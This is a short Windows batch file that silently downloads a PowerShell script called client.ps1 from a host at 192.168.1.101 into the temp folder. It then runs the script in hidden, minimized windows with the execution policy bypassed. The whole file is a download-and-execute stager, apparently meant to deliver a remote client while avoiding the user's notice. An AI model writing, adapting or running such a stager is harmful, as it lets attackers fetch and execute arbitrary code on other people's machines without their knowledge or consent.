@echo off
set "scriptUrl=http://192.168.1.101:1000/client.ps1"
set "scriptPath=%TEMP%\client.ps1"


PowerShell.exe -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri '%scriptUrl%' -OutFile '%scriptPath%'}"

start /min PowerShell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%scriptPath%"